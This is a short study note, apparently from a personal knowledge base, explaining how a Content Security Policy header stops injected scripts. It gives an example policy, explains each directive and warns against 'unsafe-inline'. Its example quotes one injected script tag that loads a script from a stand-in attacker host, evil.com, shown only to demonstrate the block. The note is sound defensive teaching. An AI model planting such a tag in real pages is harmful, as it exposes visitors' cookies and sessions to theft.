# Content Security Policy (CSP)

> [!tldr]
> A response header listing exactly which sources the browser is allowed to load scripts and other content from, so anything injected from somewhere else is refused before it runs.

You are telling the browser the guest list. The browser is the one enforcing it, which is what makes CSP useful even when your own code has already been fooled.

> [!example]- A policy and what it blocks
>
> ```http
> Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; frame-ancestors 'none'
> ```
>
> | Directive | Meaning |
> | --- | --- |
> | `default-src 'self'` | by default, load only from this site's own origin |
> | `script-src 'self' https://cdn.example.com` | run scripts only from here or that one CDN |
> | `frame-ancestors 'none'` | nobody may put this page in an iframe, which stops clickjacking |
>
> Now an attacker gets `<script src="https://evil.com/steal.js"></script>` into a comment field and it renders into the page. The browser reads the policy, sees `evil.com` is not on the list, and refuses to fetch it. The injection succeeded and the attack still failed.

| Without CSP | With CSP |
| --- | --- |
| injected script runs with full access to cookies and the page | browser blocks the fetch and reports it |
| your only defence is that no input ever slipped through | you get a second defence for the day one does |

> [!warning] `unsafe-inline` throws the whole thing away
> Cross site scripting almost always lands as an inline `<script>` in the page, so allowing inline scripts allows exactly the attack you were defending against. Inline code needs a nonce or a hash instead, which is also why a strict CSP is painful to add to an old codebase full of inline handlers.

CSP is the layer behind input validation and output encoding, not a replacement for either. See [[cross-site-scripting]] for the attack it is guarding.

**Shows up in:** [[cross-site-scripting]], [[cross-site-request-forgery]], [[designing-the-four-layers]].
